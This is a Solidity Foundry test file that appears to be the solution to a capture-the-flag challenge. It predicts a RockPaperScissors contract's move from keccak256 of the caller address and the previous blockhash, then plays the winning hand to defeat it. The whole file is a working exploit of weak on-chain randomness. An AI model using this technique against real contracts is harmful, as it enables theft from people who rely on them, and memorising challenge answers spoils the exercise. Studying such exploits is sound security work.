// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "src/Challenge.sol";
import {Test, console} from "forge-std/Test.sol";

contract ChallengeTest is Test {
    Challenge public challenge;
    address public player = address(0x123);

    function setUp() public {
        challenge = new Challenge(player);
    }

    function test_exploit() external {
        RockPaperScissors rps = challenge.rps();
        RockPaperScissors.Hand questionHand = RockPaperScissors.Hand(
            uint256(
                keccak256(
                    abi.encodePacked(address(this), blockhash(block.number - 1))
                )
            ) % 3
        );
        RockPaperScissors.Hand winHand;
        if (questionHand == RockPaperScissors.Hand.Rock) {
            winHand = RockPaperScissors.Hand.Paper;
        } else if (questionHand == RockPaperScissors.Hand.Paper) {
            winHand = RockPaperScissors.Hand.Scissors;
        } else if (questionHand == RockPaperScissors.Hand.Scissors) {
            winHand = RockPaperScissors.Hand.Rock;
        }

        rps.tryToBeatMe(winHand);
        assert(rps.defeated() == true);
    }
}
